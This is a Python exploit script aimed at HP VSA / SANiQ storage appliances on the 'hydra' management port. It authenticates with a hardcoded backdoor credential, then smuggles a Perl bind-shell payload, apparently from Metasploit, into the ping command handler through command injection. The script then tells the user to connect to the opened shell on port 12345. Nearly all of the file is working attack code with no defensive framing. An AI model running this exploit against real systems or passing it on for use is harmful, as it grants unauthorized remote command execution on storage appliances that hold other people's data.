
#!/usr/bin/python
 
''' ==================================
          Pseudo documentation
================================== '''
 
# HP VSA / SANiQ Hydra client
# Nicolas Gréire <nicolas.gregoire@agarri.fr>
# v0.5
 
''' ==================================
          Target information
================================== '''
 
HOST = '192.168.201.11' # The remote host
PORT = 13838        # The hydra port
 
''' ==================================
             Imports
================================== '''
 
import getopt
import re
import sys
import binascii
import struct
import socket
import os
 
''' ==================================
        Define functions
================================== '''
 
# Some nice formatting
def zprint(str):
    print '[=] ' + str
 
# Define packets
def send_Exec():
    zprint('Send Exec')
     
    # RESTRICTIONS
    # You can't use "/" in the payload
    # No Netcat/Ruby/PHP, but telnet/bash/perl are available
 
    # METASPLOIT PAYLOAD
    cmd = "perl -MIO -e '$p=fork();exit,if$p;$c=new IO::Socket::INET(LocalPort,12345,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'"
 
    # COMMAND INJECTION BUG
    data = 'get:/lhn/public/network/ping/127.0.0.1/foobar;' + cmd + '/'
 
    # EXPLOIT
    zprint('Now connect to port 12345 of machine ' + str(HOST))
    send_packet(data)
 
def send_Login():
    zprint('Send Login')
    data = 'login:/global$agent/L0CAlu53R/Version "8.5.0"' # Backdoor
    send_packet(data)
 
# Define the sending function
def send_packet(message):
 
    # Add header
    ukn1 = '\x00\x00\x00\x00\x00\x00\x00\x01'
    ukn2 = '\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x00\x00\x00\x14\xff\xff\xff\xff'
    message = message + '\x00'
    data = ukn1 + struct.pack('!I', len(message)) + ukn2 + message
 
    # Send & receive
    s.send(data)
    data = s.recv(1024)
    zprint('Received : [' + data + ']')
 
''' ==================================
           Main code
================================== '''
 
# Print bannner
zprint('HP Hydra client')
zprint('Attacking host ' + HOST + ' on port ' + str(PORT))
 
# Connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(30)
s.connect((HOST, PORT))
 
# Attack !
send_Login()
send_Exec()
 
# Deconnect
s.close
 
# Exit
zprint('Exit')
